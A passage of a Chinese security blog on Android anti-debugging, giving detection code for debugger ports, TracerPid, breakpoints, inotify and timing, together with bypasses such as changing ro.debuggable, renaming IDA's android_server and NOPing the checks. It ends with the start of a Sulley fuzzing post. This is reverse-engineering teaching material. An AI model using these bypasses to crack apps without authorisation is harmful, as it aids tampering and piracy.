<p>这个是为了防止破解者在应用的AndroidManifest.xml中添加：<code>android:debuggable=true</code>属性，然后对应用进行调试。解决方法是通过将/default.prop中的Android系统属性<code>ro.debuggable</code>修改为1即可使得所有应用可以被调试。<br><strong>检查应用是否处于调试状态</strong><br>这种方法也是通过系统的API：<code>android.os.Debug.isDebuggerConnected();</code>判断当前应用有没有被调试。用jdb进行连接操作（jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700）时，这段代码就会返回true。所以可以通过这个API判断当前应用是否处于调试状态来进行反调试。</p>
<h2 id="检查端口"><a href="#检查端口" class="headerlink" title="检查端口"></a>检查端口</h2><p>破解逆向时通常需要借助IDA，使用IDA时，在设备中要启动android_server来进行通信，android_server会默认占用23946端口：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:&#x2F;data&#x2F;local&#x2F;tmp # .&#x2F;android_server</span><br><span class="line">IDA Android 32-bit remote debug server(ST) v1.19. Hex-Rays (c) 2004-2015</span><br><span class="line">Listening on port #23946...</span><br></pre></td></tr></table></figure>
<p>查看设备的TCP端口使用情况：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:&#x2F; # cat &#x2F;proc&#x2F;net&#x2F;tcp</span><br><span class="line">  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode</span><br><span class="line">   0: 00000000:5D8A 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 63939 1 00000000 100 0 0 10 -1</span><br></pre></td></tr></table></figure>
<p>其中5D8A转换成十进制就是23946，而看到uid是0，因为运行android_server是root身份。只要在JNI_Onload最开始加上下面的函数即可检测：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_port</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> bufsize = <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">char</span> filename[bufsize];</span><br><span class="line">    <span class="keyword">char</span> line[bufsize];</span><br><span class="line">    <span class="keyword">int</span> pid = getpid();</span><br><span class="line">    <span class="built_in">sprintf</span>(filename, <span class="string">&quot;/proc/net/tcp&quot;</span>);</span><br><span class="line">    FILE *fd = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (fgets(line, bufsize, fd)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;5D8A&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> ret = kill(pid, SIGKILL);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决办法就是换一个端口：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:&#x2F;data&#x2F;local&#x2F;tmp # .&#x2F;as -p6666</span><br><span class="line">IDA Android 32-bit remote debug server(ST) v1.19. Hex-Rays (c) 2004-2015</span><br><span class="line">Listening on port #6666...</span><br></pre></td></tr></table></figure>

<h2 id="读取进程状态"><a href="#读取进程状态" class="headerlink" title="读取进程状态"></a>读取进程状态</h2><p>在使用IDA进行调试的时候，需要在设备端启动android_server进行通信，那么被调试的进程就会被附加，TracerPid就是android_server进程的pid值了。所以可以在应用中的native层加上一个循环检查status中的TracerPid字段的值，如果非0或是非本进程pid（如果采用了第一种方法），那么就认为被附加调试了。还可以检查进程列表中有没有android_server进程。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:&#x2F; # cat &#x2F;proc&#x2F;12730&#x2F;status</span><br><span class="line">Name:    com.bruce</span><br><span class="line">State:    t (tracing stop) &lt;-非调试状态为S或R</span><br><span class="line">Tgid:    12730</span><br><span class="line">Pid:    12730</span><br><span class="line">PPid:    179</span><br><span class="line">TracerPid:    32354 &lt;- 非0非本进程pid，被附加</span><br><span class="line">Uid:    10128    10128    10128    10128</span><br><span class="line">Gid:    10128    10128    10128    10128</span><br><span class="line">FDSize:    256</span><br><span class="line">Groups:    50128</span><br></pre></td></tr></table></figure>
<p>将下面这个函数加到JNI_Onload中，或者在JNI_Onload中新建一个线程不停地进行检查。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_tracerpid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = getpid();</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">char</span> filename[bufsize];</span><br><span class="line">    <span class="keyword">char</span> line[bufsize];</span><br><span class="line">    <span class="keyword">int</span> tracerpid;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="built_in">sprintf</span>(filename, <span class="string">&quot;/proc/%d/status&quot;</span>, pid);</span><br><span class="line">    fp = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (fgets(line, bufsize, fp)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;TracerPid&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                tracerpid = atoi(&amp;line[<span class="number">10</span>]);</span><br><span class="line">                <span class="keyword">if</span> (tracerpid != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> ret = kill(pid, SIGKILL);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决方法：<br>1.修改内存中的值，但是有时候是循环检查，每次都修改不方便；<br>2.patch so文件，将循环检查的函数NOP掉；<br>3.一种比较复杂的方法，但是可以一劳永逸：<a target="_blank" rel="noopener" href="http://www.wjdiankong.cn/android%E9%80%86%E5%90%91%E4%B9%8B%E6%97%85-%E5%BA%94%E7%94%A8%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88%E8%A7%A3%E6%9E%90%E9%99%84%E5%8A%A0%E4%BF%AE%E6%94%B9ida%E8%B0%83%E8%AF%95/">修改内核信息</a><br>读取/proc/pid/wchan:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:&#x2F; # cat &#x2F;proc&#x2F;12730&#x2F;wchan</span><br><span class="line">ptrace_stop &lt;- 非调试状态为ep_poll</span><br></pre></td></tr></table></figure>

<h2 id="模拟器检测"><a href="#模拟器检测" class="headerlink" title="模拟器检测"></a>模拟器检测</h2><p>检测应用是不是运行在一台模拟器中：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isEmulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class systemPropertyClazz = Class.forName(<span class="string">&quot;android.os.SystemProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> kernelQemu = getProperty(systemPropertyClazz, <span class="string">&quot;ro.kernel.qemu&quot;</span>).length() &gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">boolean</span> hardwareGoldfish = getProperty(systemPropertyClazz, <span class="string">&quot;ro.hardware&quot;</span>).equals(<span class="string">&quot;goldfish&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> modelSdk = getProperty(systemPropertyClazz, <span class="string">&quot;ro.product.model&quot;</span>).equals(<span class="string">&quot;sdk&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernelQemu || hardwareGoldfish || modelSdk) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// error assumes emulator</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getProperty</span><span class="params">(Class clazz, String propertyName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (String) clazz.getMethod(<span class="string">&quot;get&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;).invoke(clazz, <span class="keyword">new</span> Object[] &#123;propertyName&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="检测android-server关键字以及文件目录"><a href="#检测android-server关键字以及文件目录" class="headerlink" title="检测android_server关键字以及文件目录"></a>检测android_server关键字以及文件目录</h2><p>调试进程的时候，这个进程会被IDA中的android_server附加，而在<code>/proc/pid/cmdline</code>中会有进程的进程名，因此通过android_server的进程号可以找到它的进程名：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:&#x2F; # cat &#x2F;proc&#x2F;3514&#x2F;cmdline</span><br><span class="line">.&#x2F;android_server</span><br></pre></td></tr></table></figure>
<p>android_server的进程号可以通过TracerPid来获得。如果有这个名字说明应用正在被调试。<br>一般情况下，android_server都会放在/data/local/tmp目录下，因此还可以检测这个目录中有没有android_server，如果有就退出程序。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_andser</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 获取tracerpid之后</span></span><br><span class="line">    <span class="keyword">if</span> (tracerpid != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(filename, <span class="string">&quot;/proc/%d/cmdline&quot;</span>, tracerpid);</span><br><span class="line">        FILE *fd = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (fgets(nameline, bufsize, fd)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strstr</span>(nameline, <span class="string">&quot;android_server&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> ret = kill(pid, SIGKILL);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决方法：将android_server重命名一下，如果有目录检查就换一个目录。</p>
<h2 id="检测调试状态下的软件断点"><a href="#检测调试状态下的软件断点" class="headerlink" title="检测调试状态下的软件断点"></a>检测调试状态下的软件断点</h2><p>调试时下断点是利用的ptrace系统函数，在调试器设置断点的时候，首先完成两件事：</p>
<ul>
<li>保存目标地址上的数据</li>
<li>将目标地址上的头几个字节替换为breakpoint指令，命中断点触发breakpoint，这时程序向操作系统发送SIGRAP信号，调试器收到SIGRAP信号后，调试器会回退被跟踪进程的当前PC值，当控制权回到原进程时，PC就恰好指向了断点所在位置，这就是调试器设置断点的基本原理。</li>
</ul>
<p>软件断点通过改写目标地址的头几字节为breakpoint指令，接下来类似于前面所讲的几种方法，直接进行检测文件，可以遍历so中可执行segment，查找是否出现breakpoint指令即可。<br>关键函数实现如下：<br>1.读取ELF文件在内存中的地址：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">GetLibAddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> name[] = <span class="string">&quot;libxxx.so&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>], *temp;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    pid = getpid();</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>, pid);</span><br><span class="line">    fp = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> _error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), fp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, name)) &#123;</span><br><span class="line">            temp = strtok(buf, <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            ret = strtoul(temp, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    _error: fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.读取完以后，根据其对应的偏移地址进行检测，有没有ARM、Thumb、Thumb2的断点指令，如果有就kill进程：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_breakpoint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = getpid();</span><br><span class="line">    Elf32_Ehdr *elfhdr;</span><br><span class="line">    Elf32_Phdr *pht;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size, base, offset, phtable;</span><br><span class="line">    <span class="keyword">int</span> n, i,j;</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="comment">//从maps中读取elf文件在内存中的起始地址</span></span><br><span class="line">    base = GetLibAddr();</span><br><span class="line">    <span class="keyword">if</span> (base == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    elfhdr = (Elf32_Ehdr *) base;</span><br><span class="line">    phtable = elfhdr-&gt;e_phoff + base;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; elfhdr-&gt;e_phnum; i++) &#123;</span><br><span class="line">        pht = (Elf32_Phdr *)(phtable + i * <span class="keyword">sizeof</span>(Elf32_Phdr));</span><br><span class="line">        <span class="keyword">if</span> (pht-&gt;p_flags &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            offset = pht-&gt;p_vaddr + base + <span class="keyword">sizeof</span>(Elf32_Ehdr) + <span class="keyword">sizeof</span>(Elf32_Phdr)*elfhdr-&gt;e_phnum;</span><br><span class="line">            p = (<span class="keyword">char</span>*)offset;</span><br><span class="line">            size = pht-&gt;p_memsz;</span><br><span class="line">            <span class="keyword">for</span> (j=<span class="number">0</span>, n=<span class="number">0</span>; j &lt; size; ++j, ++p) &#123;</span><br><span class="line">                <span class="keyword">if</span> (*p == <span class="number">0x10</span> &amp;&amp; *(p+<span class="number">1</span>) == <span class="number">0xde</span>) &#123;</span><br><span class="line">                    n++;</span><br><span class="line">                    <span class="keyword">int</span> ret1 = kill(pid, SIGKILL);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*p == <span class="number">0xf0</span> &amp;&amp; *(p+<span class="number">1</span>) == <span class="number">0xf7</span> </span><br><span class="line">                &amp;&amp; *(p+<span class="number">2</span>) == <span class="number">0x00</span> &amp;&amp; *(p+<span class="number">3</span>) == <span class="number">0xa0</span>) &#123;</span><br><span class="line">                    n++;</span><br><span class="line">                    <span class="keyword">int</span> ret2 = kill(pid, SIGKILL);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(*p == <span class="number">0x01</span> &amp;&amp; *(p+<span class="number">1</span>) == <span class="number">0x00</span> </span><br><span class="line">                &amp;&amp; *(p+<span class="number">2</span>) == <span class="number">0x9f</span> &amp;&amp; *(p+<span class="number">3</span>) == <span class="number">0xef</span>) &#123;</span><br><span class="line">                    n++;</span><br><span class="line">                    <span class="keyword">int</span> ret3 = kill(pid, SIGKILL);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决方法：一般这种函数可以在JNI_Onload、com_java_XX这类函数中调用，经过几次动态调试就可以找出关键函数，将其NOP掉就可以了。</p>
<h2 id="使用Inotify对文件进行监控"><a href="#使用Inotify对文件进行监控" class="headerlink" title="使用Inotify对文件进行监控"></a>使用Inotify对文件进行监控</h2><p>在动态调试的过程中，一般会查看调试进程的虚拟地址空间或者是dump内存，这时就会涉及到对文件的读写以及打开的权限，这时候对它们进行检测就能发现是否正在被破解。Linux下的Inotify就可以实现对文件系统事件的打开，读写的监管。如果通过Inotify收到事件的变化，我们就Kill掉进程。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_inotify</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret, len, i;</span><br><span class="line">    <span class="keyword">int</span> pid = getpid();</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> MAXLEN = <span class="number">2048</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">char</span> readbuf[MAXLEN];</span><br><span class="line">    <span class="keyword">int</span> fd, wd;</span><br><span class="line">    fd_set readfds;</span><br><span class="line">    fd = inotify_init();</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>, pid);</span><br><span class="line">    wd = inotify_add_watch(fd, buf, IN_ALL_EVENTS);</span><br><span class="line">    <span class="keyword">if</span> (wd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            i = <span class="number">0</span>;</span><br><span class="line">            FD_ZERO(&amp;readfds); <span class="comment">// 使得readfds清零</span></span><br><span class="line">            FD_SET(fd, &amp;readfds); <span class="comment">// 将fd加入readfds集合</span></span><br><span class="line">            ret = select(fd + <span class="number">1</span>, &amp;readfds, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">                len = read(fd, readbuf, MAXLEN);</span><br><span class="line">                <span class="keyword">while</span> (i &lt; len) &#123;</span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">inotify_event</span> *<span class="title">event</span> =</span> (struct inotify_event *) &amp;readbuf[i];</span><br><span class="line">                    <span class="keyword">if</span> ((event-&gt;mask &amp; IN_ACCESS) || (event-&gt;mask &amp; IN_OPEN)) &#123;</span><br><span class="line">                        <span class="keyword">int</span> ret = kill(pid, SIGKILL);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    i += <span class="keyword">sizeof</span>(struct inotify_event) + event-&gt;len;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    inotify_rm_watch(fd, wd);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="代码执行时间差检测"><a href="#代码执行时间差检测" class="headerlink" title="代码执行时间差检测"></a>代码执行时间差检测</h2><p>动态调试的时候关键代码的前后时间差比正常执行的时候要大许多，因此可以计算代码执行时间，如果超出一般正常情况下设定值，就认为代码被调试。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gettimeofday</span><span class="params">(struct timeval *tv, struct timezone *tz)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_time</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = getpid();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">t1</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">t2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line">    gettimeofday(&amp;t1, &amp;tz);</span><br><span class="line">    gettimeofday(&amp;t2, &amp;tz);</span><br><span class="line">    <span class="keyword">int</span> timeoff = (t2.tv_sec) - (t1.tv_sec);</span><br><span class="line">    <span class="keyword">if</span> (timeoff &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> ret = kill(pid, SIGKILL);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/feibabeibei_beibei/article/details/60956307"> Android反调试方法总结以及源码实现之检测篇（一）</a><br><a target="_blank" rel="noopener" href="http://www.wjdiankong.cn/android%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E4%B9%8B%E6%97%85-android%E5%BA%94%E7%94%A8%E5%8F%8D%E8%B0%83%E8%AF%95%E6%93%8D%E4%BD%9C%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%A1%88%E8%A7%A3/">Android安全防护之旅—Android应用”反调试”操作的几种方案解析</a><br>《Android安全攻防实战》</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/12/%E4%BD%BF%E7%94%A8sulley-framework/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/12/%E4%BD%BF%E7%94%A8sulley-framework/" class="post-title-link" itemprop="url">使用sulley framework</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-12 23:26:39" itemprop="dateCreated datePublished" datetime="2017-04-12T23:26:39+08:00">2017-04-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>sulley的安装过程就不介绍了，<a target="_blank" rel="noopener" href="https://github.com/OpenRCE/sulley/wiki/Windows-Installation">官网</a>的介绍很详细。下面先介绍一些sulley的基本用法，再对WarFTPD1.6（有已知的缓冲区溢出漏洞）进行模糊测试，主要目的是了解sulley的使用方法。</p>
